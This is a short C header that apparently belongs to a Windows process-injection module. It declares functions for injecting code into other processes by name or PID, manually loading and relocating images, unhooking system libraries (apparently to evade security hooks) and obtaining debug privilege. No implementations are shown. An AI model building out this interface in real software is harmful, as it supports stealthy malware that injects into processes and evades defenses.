#ifndef INJECT_MOD
#define INJECT_MOD

typedef void (*TFindProcCallBack)( DWORD dwProcessID );

PVOID QueryInformation ( SYSTEMINFOCLASS dwClass );
HANDLE	Inject(PWCHAR ProcName, DWORD PID, PTHREAD_START_ROUTINE RemoteProc, DWORD Base, HANDLE hThread = 0);
void	ProcessImport(DWORD Image, BOOL LoadNewModules);
void FixBase(PVOID Image, UINT dwDelta, BOOL isRawFile = false);
bool	UnHookSystemLib(PCHAR szModule);
DWORD	FindProcess ( LPCWSTR szProcessName, TFindProcCallBack pFunc = NULL );
BOOL	GetDebug();
BOOL	GetDriver();

#endif